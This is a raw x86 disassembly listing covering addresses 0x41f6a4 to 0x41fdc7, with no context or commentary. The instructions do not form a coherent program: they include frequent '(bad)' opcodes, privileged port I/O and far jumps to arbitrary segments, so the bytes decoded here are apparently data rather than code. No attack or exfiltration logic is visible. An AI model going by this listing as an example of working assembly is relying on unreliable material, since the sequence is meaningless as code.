  41f6a4:	mov    WORD PTR [edx+0x7e77c2ce],ss
  41f6aa:	add    dh,BYTE PTR [edi]
  41f6ac:	icebp  
  41f6ad:	adc    esi,DWORD PTR [ebx-0x45]
  41f6b0:	mov    cl,0x25
  41f6b2:	add    BYTE PTR [edi+0x78860508],0xf
  41f6b9:	sti    
  41f6ba:	sub    cl,0xa6
  41f6bd:	push   es
  41f6be:	cld    
  41f6bf:	stos   BYTE PTR es:[edi],al
  41f6c0:	adc    al,0x9f
  41f6c2:	mov    ds:0xc4d50640,al
  41f6c7:	push   ebx
  41f6c8:	mov    ecx,0xdb6c7aa3
  41f6cd:	in     al,0xf0
  41f6cf:	add    DWORD PTR [ebx+eax*8-0x53],ebx
  41f6d3:	sbb    BYTE PTR ds:0xf21e84f0,dl
  41f6d9:	aaa    
  41f6da:	mov    cs,WORD PTR [eax+0x33]
  41f6dd:	adc    BYTE PTR [edx+0x61],ch
  41f6e0:	(bad)
  41f6e4:	push   edx
  41f6e5:	ret    
  41f6e6:	jb     0x41f6a6
  41f6e8:	add    al,0xe8
  41f6ea:	pop    ebx
  41f6eb:	cmc    
  41f6ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f6ed:	or     al,0xf9
  41f6ef:	mov    ch,0xd0
  41f6f1:	xor    al,0x6c
  41f6f3:	ins    DWORD PTR es:[edi],dx
  41f6f4:	test   DWORD PTR [edi+ecx*8-0xa],0x18c18224
  41f6fc:	scas   eax,DWORD PTR es:[edi]
  41f6fd:	mov    DWORD PTR [ecx+0x2f01add9],edx
  41f703:	cmc    
  41f704:	arpl   sp,bp
  41f706:	imul   ecx,DWORD PTR [edi],0xffffffe1
  41f709:	ror    BYTE PTR [edx+0x23],1
  41f70c:	fs (bad) 
  41f70e:	outs   dx,DWORD PTR ds:[esi]
  41f70f:	jb     0x41f6fb
  41f711:	(bad)  
  41f712:	pop    ecx
  41f713:	xor    edi,ebp
  41f715:	jnp    0x41f71f
  41f717:	mov    bl,bl
  41f719:	pop    eax
  41f71a:	cmp    bl,BYTE PTR [esi+0x4b66cf58]
  41f720:	dec    ebp
  41f721:	or     bl,dl
  41f723:	mov    cl,bh
  41f725:	hlt    
  41f726:	call   0x58be0178
  41f72b:	push   ds
  41f72c:	inc    ecx
  41f72d:	cmp    dl,BYTE PTR [ecx]
  41f72f:	sbb    al,0x91
  41f732:	mov    dl,0x6f
  41f734:	nop
  41f735:	push   edx
  41f736:	add    BYTE PTR [ecx-0x5d],dh
  41f739:	sar    BYTE PTR [edi-0x10dd824e],0xe9
  41f740:	or     ch,BYTE PTR [eax-0x29]
  41f743:	mov    al,0x46
  41f745:	push   edi
  41f746:	dec    edx
  41f747:	imul   edx,DWORD PTR [ebx-0x46],0xffffffbc
  41f74b:	popa   
  41f74c:	jns    0x41f735
  41f74e:	adc    BYTE PTR [eax-0xa13d62b],al
  41f754:	xchg   ebx,eax
  41f755:	test   eax,0xeea25e63
  41f75a:	xchg   ebx,eax
  41f75b:	or     bh,BYTE PTR [ecx]
  41f75d:	in     eax,dx
  41f75e:	mov    bl,0x59
  41f760:	inc    ebp
  41f761:	mov    ebp,DWORD PTR [ecx-0x4]
  41f764:	mov    esp,0xf30b7ebe
  41f769:	stc    
  41f76a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f76b:	ret    
  41f76c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f76d:	jmp    0x3265:0x2e306a54
  41f774:	(bad)  
  41f775:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f776:	add    bl,BYTE PTR [esi]
  41f778:	add    al,0x4a
  41f77a:	push   esp
  41f77b:	inc    ecx
  41f77c:	or     eax,0xf39b1f56
  41f781:	xchg   esi,eax
  41f782:	or     eax,0x7d8e7247
  41f787:	pop    eax
  41f788:	xchg   bl,cl
  41f78a:	cmp    bl,dh
  41f78c:	rcl    DWORD PTR [esi+eiz*4],1
  41f78f:	stos   DWORD PTR es:[edi],eax
  41f790:	pop    ebp
  41f791:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f792:	xchg   ebx,eax
  41f793:	cmp    al,0xa5
  41f795:	stos   DWORD PTR es:[edi],eax
  41f796:	test   al,0xe4
  41f798:	repz add al,0xb8
  41f79b:	retf   
  41f79c:	adc    BYTE PTR [edx+0x2f2c3639],dh
  41f7a2:	and    al,0x75
  41f7a4:	mov    BYTE PTR [ebp-0x3a89c3be],al
  41f7aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f7ab:	mov    edx,0xb6d15c92
  41f7b0:	repnz aas 
  41f7b2:	pop    ds
  41f7b3:	pop    esp
  41f7b4:	popf   
  41f7b5:	push   edx
  41f7b6:	inc    esi
  41f7b7:	jle    0x41f7a4
  41f7b9:	mov    esi,0xc07cfd1c
  41f7be:	adc    bl,bh
  41f7c0:	fbld   TBYTE PTR [esi+0xfcdaf0f]
  41f7c6:	stc    
  41f7c7:	lea    eax,[eax+0x79]
  41f7ca:	out    0xac,eax
  41f7cc:	mov    bh,0x7c
  41f7ce:	xor    bh,BYTE PTR [ebx]
  41f7d0:	jmp    DWORD PTR [eax-0x19]
  41f7d3:	call   FWORD PTR [edx]
  41f7d5:	mov    ds:0xd0fd72d5,eax
  41f7da:	(bad)  
  41f7db:	or     eax,0xe1180da4
  41f7e0:	inc    esp
  41f7e1:	and    ch,0x2f
  41f7e4:	adc    BYTE PTR [edi],bl
  41f7e6:	loopne 0x41f7d8
  41f7e8:	inc    ebx
  41f7e9:	inc    edi
  41f7ea:	and    BYTE PTR [esi],0xae
  41f7ed:	add    BYTE PTR [ebx+0x70e316e],bl
  41f7f3:	lock aad 0xe0
  41f7f6:	mov    dl,0x85
  41f7f8:	out    dx,al
  41f7f9:	xchg   edi,eax
  41f7fa:	lea    eax,[edx+0x6267b035]
  41f800:	shl    DWORD PTR [edx+0x1f],cl
  41f803:	test   DWORD PTR [edi+0x46],ebp
  41f806:	cld    
  41f807:	inc    edi
  41f808:	dec    edx
  41f80a:	push   0x2087662e
  41f80f:	or     bh,BYTE PTR [ebx+0x70]
  41f812:	pop    edx
  41f813:	std    
  41f814:	pop    eax
  41f815:	(bad)  
  41f816:	pop    ebx
  41f817:	pushf  
  41f818:	sbb    ch,BYTE PTR [esi]
  41f81a:	in     eax,0xcd
  41f81c:	mov    al,0x5
  41f81e:	ret    
  41f81f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f820:	inc    esi
  41f821:	mov    al,ds:0xcb24b315
  41f826:	xlat   BYTE PTR ds:[ebx]
  41f827:	int3   
  41f828:	mov    dl,0xfa
  41f82a:	mov    cl,0x6
  41f82c:	dec    edi
  41f82d:	adc    BYTE PTR [eax],bl
  41f82f:	add    al,BYTE PTR [ebx+0x38]
  41f832:	shl    BYTE PTR [eax],0xd3
  41f835:	int3   
  41f836:	sbb    eax,DWORD PTR [ecx]
  41f838:	xchg   BYTE PTR [edx-0x6ac6c5f6],dl
  41f83e:	jp     0x41f7f0
  41f840:	sbb    BYTE PTR [ebx],0xe5
  41f843:	div    edi
  41f845:	mov    esi,0xa645bfe1
  41f84a:	push   eax
  41f84b:	jmp    0x7424:0xec636f08
  41f852:	mov    WORD PTR ds:0x4d7a4039,?
  41f858:	retf   
  41f859:	xor    BYTE PTR [edx-0x7e],bh
  41f85c:	test   DWORD PTR [ecx+0x55e84963],edx
  41f862:	add    ebx,DWORD PTR [ecx+0x5c]
  41f865:	scas   al,BYTE PTR es:[edi]
  41f866:	test   BYTE PTR [eax+0x7ece2b88],bl
  41f86c:	jb     0x41f85b
  41f86e:	xchg   ebx,eax
  41f86f:	les    edi,FWORD PTR [esi-0x60]
  41f872:	inc    edi
  41f873:	sti    
  41f874:	std    
  41f875:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f876:	push   ss
  41f877:	shl    dh,0xcd
  41f87a:	cmp    al,0xee
  41f87c:	sub    dl,ah
  41f87e:	or     cl,BYTE PTR [eax-0x72975264]
  41f884:	mov    ecx,0xb546a07
  41f889:	xchg   ecx,eax
  41f88a:	clc    
  41f88b:	and    eax,0x17ae8157
  41f890:	xor    bl,cl
  41f892:	xor    al,0x52
  41f894:	jo     0x41f82d
  41f896:	cmp    ebx,esi
  41f898:	js     0x41f881
  41f89a:	xchg   edx,eax
  41f89b:	dec    edi
  41f89c:	xchg   DWORD PTR [ebp+eiz*2+0x36cb7d40],ebx
  41f8a3:	xchg   ecx,eax
  41f8a4:	adc    esp,DWORD PTR [ecx+esi*8]
  41f8a7:	push   ebp
  41f8a8:	rol    BYTE PTR [edi-0x2a757782],1
  41f8ae:	and    esp,edi
  41f8b0:	jns    0x41f87d
  41f8b2:	cmp    eax,0x13c725fc
  41f8b7:	dec    ecx
  41f8b8:	call   0x57e1968e
  41f8bd:	das    
  41f8be:	add    eax,eax
  41f8c0:	xor    al,0xf8
  41f8c2:	inc    edi
  41f8c3:	mov    edi,ebx
  41f8c5:	mov    dl,0xc0
  41f8c7:	test   BYTE PTR ds:0xf281f424,dh
  41f8cd:	cld    
  41f8ce:	ja     0x41f8be
  41f8d0:	loope  0x41f933
  41f8d2:	and    al,BYTE PTR [edi+0x30]
  41f8d5:	loop   0x41f875
  41f8d7:	scas   al,BYTE PTR es:[edi]
  41f8d8:	call   0x6086ec69
  41f8dd:	out    0x7b,eax
  41f8df:	mov    ebp,0x5f79d14a
  41f8e4:	imul   esi,DWORD PTR [eax+0x50],0x608c2bd5
  41f8eb:	sub    al,0x3c
  41f8ed:	sbb    BYTE PTR [edi+0x7fbfe854],ah
  41f8f3:	out    0x45,al
  41f8f5:	(bad)  
  41f8f6:	cli    
  41f8f7:	push   eax
  41f8f8:	mov    ds:0x6a0a6f6f,al
  41f8fd:	lahf   
  41f8fe:	dec    ebp
  41f8ff:	mov    DWORD PTR [ebp+0x38],esi
  41f902:	jb     0x41f922
  41f904:	gs ds mov dl,0x73
  41f908:	mov    dl,0x60
  41f90a:	adc    BYTE PTR [edi-0x44b836c6],bh
  41f910:	test   al,0x91
  41f912:	or     al,0x52
  41f914:	int3   
  41f915:	mov    DWORD PTR cs:[eax],edi
  41f918:	push   eax
  41f919:	fisubr WORD PTR [ecx-0x68f0394e]
  41f91f:	inc    ecx
  41f920:	ret    0x56af
  41f923:	and    eax,0x2a7af115
  41f928:	or     bl,ch
  41f92a:	ret    
  41f92b:	je     0x41f979
  41f92d:	rol    BYTE PTR ss:[ebx+0xebb957a],cl
  41f934:	cmp    eax,0x5d177ddc
  41f939:	mov    ebp,DWORD PTR [edx+edx*8+0x5656f223]
  41f940:	ret    0x3db
  41f943:	and    esp,DWORD PTR ds:0x53cb98c3
  41f949:	cmp    DWORD PTR [edx+0x5a],edi
  41f94c:	xchg   ebx,eax
  41f94d:	addr16 in eax,dx
  41f94f:	shr    dh,1
  41f951:	(bad)  [ebx-0xe29bc4]
  41f957:	push   esp
  41f958:	aaa    
  41f959:	add    ch,ah
  41f95b:	sahf   
  41f95c:	xor    DWORD PTR ds:0x68be7c93,edx
  41f962:	sub    eax,0xfd15d1c9
  41f967:	dec    esp
  41f968:	inc    esi
  41f969:	sbb    BYTE PTR [esi],al
  41f96b:	clc    
  41f96c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f96d:	sub    bl,BYTE PTR [edx+ebp*1+0x208d6fa0]
  41f974:	scas   al,BYTE PTR es:[edi]
  41f975:	push   ebp
  41f976:	adc    dh,dh
  41f978:	xor    ch,ah
  41f97a:	jmp    DWORD PTR [esi]
  41f97c:	jp     0x41f9c8
  41f97e:	adc    esp,DWORD PTR [ebx+0x6]
  41f981:	dec    edx
  41f982:	test   DWORD PTR ss:[edx],edi
  41f985:	cld    
  41f986:	mov    ah,BYTE PTR [edi+edx*2+0x48edbf1b]
  41f98d:	retf   0x1492
  41f990:	stos   DWORD PTR es:[edi],eax
  41f991:	loopne 0x41f93e
  41f993:	sub    BYTE PTR [edx],dl
  41f995:	pop    esi
  41f996:	pop    ds
  41f997:	call   DWORD PTR [ebx-0x5ae673bc]
  41f99d:	call   0x8cac90a3
  41f9a2:	and    DWORD PTR [eax],edi
  41f9a4:	(bad)  
  41f9a5:	lea    ebx,[edi]
  41f9a7:	pop    edx
  41f9a8:	mov    WORD PTR [edx],gs
  41f9aa:	inc    edi
  41f9ab:	data16 mov ah,0x71
  41f9ae:	mov    al,0x3b
  41f9b0:	jge    0x41f95f
  41f9b2:	add    bl,BYTE PTR [ecx+0x2b]
  41f9b5:	loop   0x41f9a6
  41f9b7:	pop    ecx
  41f9b8:	shl    DWORD PTR [esi-0x69],1
  41f9bb:	fsubr  QWORD PTR [ecx]
  41f9bd:	out    0xa1,al
  41f9bf:	and    eax,ebp
  41f9c1:	push   eax
  41f9c2:	mov    ebp,0xb7f8f343
  41f9c7:	cmp    al,0x47
  41f9c9:	adc    ebx,DWORD PTR [ecx]
  41f9cb:	xchg   edx,eax
  41f9cc:	shl    esp,1
  41f9ce:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41f9d0:	push   ecx
  41f9d1:	jnp    0x41f998
  41f9d3:	add    ecx,esi
  41f9d5:	fcomp  QWORD PTR [ecx-0x5e]
  41f9d8:	push   ds
  41f9d9:	xchg   esp,eax
  41f9da:	inc    edi
  41f9db:	sar    BYTE PTR [esi-0x2],cl
  41f9de:	pop    esp
  41f9df:	pop    esi
  41f9e0:	mov    ebx,0xea2e0d0e
  41f9e5:	sbb    ebx,DWORD PTR [esi+0x32]
  41f9e8:	mov    bl,0x88
  41f9ea:	add    BYTE PTR [edi],dh
  41f9ec:	test   BYTE PTR [ebx+0x2517a2b9],dl
  41f9f2:	hlt    
  41f9f3:	(bad)  
  41f9f4:	fisubr DWORD PTR [ebp+edi*1-0x2]
  41f9f8:	stos   DWORD PTR es:[edi],eax
  41f9f9:	loopne 0x41fa53
  41f9fb:	imul   ebp,DWORD PTR [ebp-0x42],0xffffffec
  41f9ff:	lods   eax,DWORD PTR ds:[esi]
  41fa00:	(bad)  ds:0xa69dd070
  41fa06:	int3   
  41fa07:	pop    ds
  41fa08:	popf   
  41fa09:	xchg   esi,eax
  41fa0a:	pop    ds
  41fa0b:	mov    dl,0x6c
  41fa0d:	aam    0x1
  41fa0f:	pop    eax
  41fa10:	inc    esi
  41fa11:	or     BYTE PTR [edi+0x48618ec6],ch
  41fa17:	in     eax,0xcd
  41fa19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa1a:	lea    ebx,[ebx+edx*8]
  41fa1d:	dec    edi
  41fa1e:	pop    ss
  41fa1f:	sub    DWORD PTR [ebx-0x1b],edx
  41fa22:	div    DWORD PTR [edi+0x2733a7b]
  41fa28:	ret    0x6
  41fa2b:	cmp    edx,DWORD PTR [esi]
  41fa2d:	cmp    eax,0x76b6864a
  41fa32:	mov    dl,0xe6
  41fa34:	push   ebx
  41fa35:	scas   al,BYTE PTR es:[edi]
  41fa36:	dec    ebx
  41fa37:	ficom  WORD PTR [ebp-0x4cb0598b]
  41fa3d:	jp     0x41fa5a
  41fa3f:	sub    al,0x21
  41fa41:	xor    al,0x14
  41fa43:	or     BYTE PTR [ebp-0x1743bd32],al
  41fa49:	pushf  
  41fa4a:	into   
  41fa4b:	cmp    al,0x4e
  41fa4d:	test   al,0xfc
  41fa4f:	(bad)  
  41fa51:	sub    ah,cl
  41fa53:	imul   ecx,DWORD PTR [ecx-0x37],0x4eab233
  41fa5a:	xchg   DWORD PTR [ebp+0x2d],ecx
  41fa5d:	call   FWORD PTR ds:0x7528029f
  41fa63:	sti    
  41fa64:	adc    eax,0x25f7842c
  41fa69:	xor    al,0xa3
  41fa6b:	sbb    BYTE PTR [ebx+0x56],dh
  41fa6e:	test   BYTE PTR [ecx+0x37],ah
  41fa71:	inc    esi
  41fa72:	ret    
  41fa73:	jnp    0x41fa17
  41fa75:	ret    0x19b
  41fa78:	sub    ah,BYTE PTR [edi]
  41fa7a:	ret    
  41fa7b:	xchg   edi,eax
  41fa7c:	or     dl,BYTE PTR [esi+0x5c]
  41fa7f:	dec    esp
  41fa80:	(bad)  
  41fa81:	sbb    DWORD PTR [edi-0x7f],edi
  41fa84:	mov    ch,BYTE PTR [eax+0x67]
  41fa87:	(bad)  
  41fa88:	cdq    
  41fa89:	inc    esi
  41fa8a:	mov    bh,dl
  41fa8c:	sub    BYTE PTR [esi+0x4d],al
  41fa8f:	das    
  41fa90:	mov    dh,0xa0
  41fa92:	(bad)  
  41fa93:	and    edx,DWORD PTR ss:[esp+ebp*2]
  41fa97:	xor    al,0x72
  41fa99:	dec    DWORD PTR [ecx]
  41fa9b:	mov    ds:0xa80efb6a,al
  41faa0:	int3   
  41faa1:	inc    ebp
  41faa2:	dec    ebp
  41faa3:	inc    edx
  41faa4:	repnz or bh,dh
  41faa7:	push   ss
  41faa8:	add    edi,ebp
  41faaa:	arpl   WORD PTR [ecx-0x2f],si
  41faad:	popf   
  41faae:	mov    ecx,0x15c9e6e9
  41fab3:	xchg   ecx,eax
  41fab4:	push   esp
  41fab5:	call   0x45c9:0x60448460
  41fabc:	pusha  
  41fabd:	push   es
  41fabe:	push   esp
  41fabf:	sar    al,0x8
  41fac2:	dec    edi
  41fac3:	(bad)  
  41fac4:	fimul  DWORD PTR [edx+0x43b0ae87]
  41faca:	mov    al,0xaa
  41facc:	adc    BYTE PTR [ebx],bl
  41face:	mov    al,BYTE PTR [edx+0x4dcb7a31]
  41fad4:	ins    DWORD PTR es:[edi],dx
  41fad5:	dec    edx
  41fad6:	outs   dx,DWORD PTR ds:[esi]
  41fad7:	pusha  
  41fad8:	mov    al,0xef
  41fada:	arpl   WORD PTR [eax],bp
  41fadc:	cmp    esi,DWORD PTR [edi]
  41fade:	outs   dx,DWORD PTR ds:[esi]
  41fadf:	push   eax
  41fae0:	enter  0x1e18,0x7f
  41fae4:	sub    eax,0x6674d2b9
  41fae9:	fst    QWORD PTR [edx-0x36d826f8]
  41faef:	lds    edx,FWORD PTR [ecx]
  41faf1:	fcomp  QWORD PTR [edx+0x61]
  41faf4:	sbb    edi,DWORD PTR [ecx-0x36]
  41faf7:	mov    ch,0x54
  41faf9:	cmp    eax,0xab958ae7
  41fafe:	gs das 
  41fb00:	scas   eax,DWORD PTR es:[edi]
  41fb01:	pop    edi
  41fb02:	cmp    ah,0xac
  41fb05:	dec    esp
  41fb06:	sbb    DWORD PTR [eax+0x48c360f3],edi
  41fb0c:	xchg   DWORD PTR [edi],ebp
  41fb0e:	imul   ecx,DWORD PTR [ebx-0x68],0xf7cfab63
  41fb15:	pop    ds
  41fb16:	jb     0x41faed
  41fb18:	xor    BYTE PTR [esi],ah
  41fb1a:	xor    eax,0xb12a56e4
  41fb1f:	and    ah,dh
  41fb21:	imul   esi,esi,0x40b08d21
  41fb27:	in     al,0x9a
  41fb29:	fstp   DWORD PTR [ecx+0x66272391]
  41fb2f:	fldenv [esi]
  41fb31:	pop    esi
  41fb32:	mov    ah,dh
  41fb34:	xor    bh,BYTE PTR [ebp+0x58cffc9d]
  41fb3a:	xor    al,0x61
  41fb3c:	bound  esp,QWORD PTR [ecx]
  41fb3e:	ins    BYTE PTR es:[edi],dx
  41fb3f:	mov    al,ds:0xc3c7b6b
  41fb44:	ret    
  41fb45:	xlat   BYTE PTR ds:[ebx]
  41fb46:	dec    esi
  41fb47:	and    DWORD PTR [edx+eax*1-0x41635be6],ebx
  41fb4e:	dec    eax
  41fb4f:	pusha  
  41fb50:	mov    eax,ds:0xa71409e7
  41fb55:	aaa    
  41fb56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb57:	add    eax,0x108dec67
  41fb5c:	inc    ecx
  41fb5d:	pusha  
  41fb5e:	ror    DWORD PTR [esp+ebp*4+0x2f],0x68
  41fb63:	xor    eax,0x4083181e
  41fb68:	or     al,0xe6
  41fb6a:	scas   eax,DWORD PTR es:[edi]
  41fb6b:	pushf  
  41fb6c:	xchg   edi,eax
  41fb6d:	outs   dx,DWORD PTR ds:[esi]
  41fb6e:	mov    bh,0xa8
  41fb70:	shl    BYTE PTR [esi+0x2a],1
  41fb73:	cmp    DWORD PTR [ebx],ebp
  41fb75:	test   DWORD PTR [edx-0x3a],esi
  41fb78:	aad    0xcb
  41fb7a:	jae    0x41fbab
  41fb7c:	stos   DWORD PTR es:[edi],eax
  41fb7d:	stc    
  41fb7e:	out    0x3,al
  41fb80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb81:	popf   
  41fb82:	in     eax,dx
  41fb83:	push   esi
  41fb84:	sahf   
  41fb85:	xor    edx,DWORD PTR [ebp+0x34]
  41fb88:	call   0x7d18:0xec65418c
  41fb8f:	xchg   esp,eax
  41fb90:	push   es
  41fb91:	mov    bl,0x8
  41fb93:	sbb    eax,0x5764f35b
  41fb98:	repnz popf 
  41fb9a:	into   
  41fb9b:	icebp  
  41fb9c:	pop    edi
  41fb9d:	mov    eax,0x2891ed58
  41fba2:	ss push ecx
  41fba4:	add    dh,BYTE PTR [edx-0xe2ebd2d]
  41fbaa:	rcr    BYTE PTR [esi+esi*4],cl
  41fbad:	in     al,0x54
  41fbaf:	dec    eax
  41fbb0:	and    DWORD PTR [edi-0x1],edx
  41fbb3:	inc    ebx
  41fbb4:	out    0xe,al
  41fbb6:	repnz mov ah,BYTE PTR [ebx+ecx*2]
  41fbba:	mov    cl,0x87
  41fbbc:	out    0x71,eax
  41fbbe:	push   esp
  41fbc0:	cwde   
  41fbc1:	sub    BYTE PTR [ebx-0x498214af],bl
  41fbc7:	out    dx,eax
  41fbc8:	imul   edi,DWORD PTR [edi-0x15],0x5a854f45
  41fbcf:	jmp    0xa0461b
  41fbd4:	test   BYTE PTR [eax+0x269f046f],0xa3
  41fbdb:	data16 std 
  41fbdd:	mov    bh,BYTE PTR [ecx+0x4]
  41fbe0:	push   0x6571a6e8
  41fbe5:	push   ebp
  41fbe6:	scas   al,BYTE PTR es:[edi]
  41fbe7:	mul    BYTE PTR [eax+ecx*4-0x3eb34292]
  41fbee:	test   DWORD PTR [esi-0x330820a6],eax
  41fbf4:	dec    edx
  41fbf5:	mov    ds:0xe1ea87f8,al
  41fbfa:	add    bh,BYTE PTR [eax]
  41fbfc:	sbb    bl,dh
  41fbfe:	push   ebp
  41fbff:	in     al,0xe8
  41fc01:	idiv   BYTE PTR [ebp-0x600345bd]
  41fc07:	or     al,0xb
  41fc09:	and    DWORD PTR [eax+esi*8],edx
  41fc0c:	xlat   BYTE PTR ds:[ebx]
  41fc0d:	adc    al,0x2a
  41fc0f:	popf   
  41fc10:	sbb    al,0x61
  41fc12:	(bad)  
  41fc13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc14:	outs   dx,DWORD PTR ds:[esi]
  41fc15:	adc    eax,ecx
  41fc17:	ins    BYTE PTR es:[edi],dx
  41fc18:	mov    cl,0xdc
  41fc1a:	inc    ebp
  41fc1b:	cmp    al,0x94
  41fc1d:	cli    
  41fc1e:	jnp    0x41fc87
  41fc20:	inc    ebx
  41fc21:	mov    al,ds:0x8298b3d0
  41fc26:	aas    
  41fc27:	std    
  41fc28:	xlat   BYTE PTR ds:[ebx]
  41fc29:	out    0xa6,eax
  41fc2b:	bound  ebp,QWORD PTR [eax-0x61b296f8]
  41fc31:	or     bh,ah
  41fc33:	out    dx,al
  41fc34:	pop    ss
  41fc35:	xchg   edi,eax
  41fc36:	jmp    0xe2e5a9d0
  41fc3b:	je     0x41fbcd
  41fc3d:	mov    al,0x73
  41fc3f:	ror    DWORD PTR [esi-0x532486fd],1
  41fc45:	dec    ebx
  41fc46:	rcr    DWORD PTR [ebx-0x346978e5],1
  41fc4c:	lds    ebx,FWORD PTR [edx+0x5b12ad2d]
  41fc52:	inc    eax
  41fc53:	lds    eax,FWORD PTR [eax]
  41fc55:	push   ebx
  41fc56:	mov    dh,0x9
  41fc58:	pusha  
  41fc59:	(bad)
  41fc5c:	lods   eax,DWORD PTR ds:[esi]
  41fc5d:	sbb    al,BYTE PTR [esi]
  41fc5f:	pusha  
  41fc60:	std    
  41fc61:	push   es
  41fc62:	pop    edi
  41fc63:	scas   eax,DWORD PTR es:[edi]
  41fc64:	xor    eax,0x44725d2c
  41fc69:	idiv   DWORD PTR [ecx+0x19]
  41fc6c:	jge    0x41fbf6
  41fc6e:	dec    ebp
  41fc6f:	jnp    0x41fc4a
  41fc71:	sbb    al,0xf
  41fc73:	mov    ds:0x8a4d904a,eax
  41fc78:	out    0x94,eax
  41fc7a:	mov    ds:0x75905374,al
  41fc7f:	xchg   edx,eax
  41fc80:	das    
  41fc81:	mov    ebp,0x9d59707a
  41fc86:	repz ficomp WORD PTR [ebp+0x1f8c4b26]
  41fc8d:	aas    
  41fc8e:	stos   BYTE PTR es:[edi],al
  41fc8f:	(bad)  
  41fc90:	loopne 0x41fc41
  41fc92:	jecxz  0x41fc26
  41fc94:	repz call 0x3d51:0x50b632e2
  41fc9c:	in     al,0xab
  41fc9e:	stos   BYTE PTR es:[edi],al
  41fc9f:	mov    ah,0xfa
  41fca1:	adc    edx,ebp
  41fca3:	push   esp
  41fca4:	(bad)  
  41fca5:	icebp  
  41fca6:	or     eax,0xae76a2d8
  41fcab:	inc    esi
  41fcac:	aam    0xb5
  41fcae:	retf   0xae12
  41fcb1:	jecxz  0x41fd23
  41fcb3:	inc    esi
  41fcb4:	or     BYTE PTR [ecx+0x4b17e8a2],0x5
  41fcbb:	dec    ebx
  41fcbc:	clc    
  41fcbd:	scas   eax,DWORD PTR es:[edi]
  41fcbe:	inc    eax
  41fcbf:	mov    dl,0x12
  41fcc1:	push   edi
  41fcc2:	stos   DWORD PTR es:[edi],eax
  41fcc3:	repnz in eax,0xe3
  41fcc6:	(bad)  
  41fcc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fcc8:	mov    al,ds:0x99ba1a5b
  41fccd:	sti    
  41fcce:	cwde   
  41fccf:	push   0x30
  41fcd1:	jne    0x41fc66
  41fcd3:	mov    bh,0x50
  41fcd5:	pop    ss
  41fcd6:	adc    DWORD PTR [eax+0x40],0x3eb2e1a6
  41fcdd:	out    dx,eax
  41fcde:	loopne 0x41fd0e
  41fce0:	sti    
  41fce1:	inc    edi
  41fce2:	add    dh,BYTE PTR [ebx+0x530afc4b]
  41fce8:	add    ah,cl
  41fcea:	stc    
  41fceb:	adc    cl,BYTE PTR [ebp-0x3c18053d]
  41fcf1:	(bad)  
  41fcf2:	bound  edi,QWORD PTR [esi+0x615be4dc]
  41fcf8:	cdq    
  41fcf9:	test   BYTE PTR [ebp-0x4655483a],0x98
  41fd00:	and    BYTE PTR [esp+ecx*1],bl
  41fd03:	jb     0x41fd2d
  41fd05:	mov    edx,0x69e11100
  41fd0a:	pop    esp
  41fd0b:	add    eax,0x7b0e0f98
  41fd10:	imul   edi,esp,0x76
  41fd13:	dec    esp
  41fd14:	fcmovb st,st(4)
  41fd16:	sbb    eax,0xb4762a5
  41fd1b:	push   0xc6eaa568
  41fd20:	in     al,dx
  41fd21:	fldenv [ebx+0x5d7b8614]
  41fd27:	xchg   esi,eax
  41fd28:	pop    ss
  41fd29:	mov    edi,0xf0c57ae8
  41fd2e:	inc    ecx
  41fd2f:	imul   DWORD PTR [edx-0x15221e0e]
  41fd35:	mov    ds,edi
  41fd37:	test   DWORD PTR [edx-0x6d],ebp
  41fd3a:	dec    eax
  41fd3b:	adc    edi,DWORD PTR [edx-0x288afc28]
  41fd41:	sahf   
  41fd42:	repnz xchg edi,eax
  41fd44:	gs icebp 
  41fd46:	pop    ecx
  41fd47:	std    
  41fd48:	dec    edi
  41fd49:	add    cl,bh
  41fd4b:	lods   eax,DWORD PTR ds:[esi]
  41fd4c:	test   DWORD PTR [ebp+0x33],0xbbce6d10
  41fd53:	xchg   DWORD PTR [ebp-0x14],ebp
  41fd56:	or     al,0xf8
  41fd58:	sub    edx,DWORD PTR [ebx-0xe]
  41fd5b:	(bad)  
  41fd5c:	pop    eax
  41fd5d:	jle    0x41fda6
  41fd5f:	loope  0x41fd28
  41fd61:	cmp    DWORD PTR [edi+0x3c56c346],0xfffffffc
  41fd68:	inc    edi
  41fd69:	shl    BYTE PTR [esp+eax*1-0x3b346c78],cl
  41fd70:	popa   
  41fd71:	fisubr DWORD PTR [eax]
  41fd73:	cs lock jae 0x41fde1
  41fd77:	mov    bl,0xe1
  41fd79:	pop    eax
  41fd7a:	mov    ebx,0xeba5a09d
  41fd7f:	js     0x41fdad
  41fd81:	adc    bl,al
  41fd83:	xor    ebx,edx
  41fd85:	adc    al,0xf0
  41fd87:	shr    BYTE PTR [ebx+0x2b],cl
  41fd8a:	sub    BYTE PTR [edx],dh
  41fd8c:	mov    bl,0x5e
  41fd8e:	and    al,0x76
  41fd90:	push   0xffffffc5
  41fd92:	test   BYTE PTR [edi+0x8ad416a],0x44
  41fd99:	or     ch,BYTE PTR [edi+0x1e]
  41fd9c:	push   es
  41fd9d:	add    eax,DWORD PTR [ecx]
  41fd9f:	dec    ebx
  41fda0:	lods   eax,DWORD PTR ds:[esi]
  41fda1:	dec    edi
  41fda2:	scas   al,BYTE PTR es:[edi]
  41fda3:	mov    DWORD PTR ds:0x5dbe39d4,esp
  41fda9:	mov    BYTE PTR [edx+0x70],ah
  41fdac:	sbb    DWORD PTR [esp+ebx*4+0x60032922],esi
  41fdb3:	mov    ecx,0xcbe98e45
  41fdb8:	push   cs
  41fdb9:	cmp    ah,0x76
  41fdbc:	stc    
  41fdbd:	fisttp DWORD PTR [ebx+0x3e3f92e9]
  41fdc3:	cld    
  41fdc4:	xchg   ebp,eax
  41fdc5:	out    0xf6,eax
  41fdc7:	fs pop edx
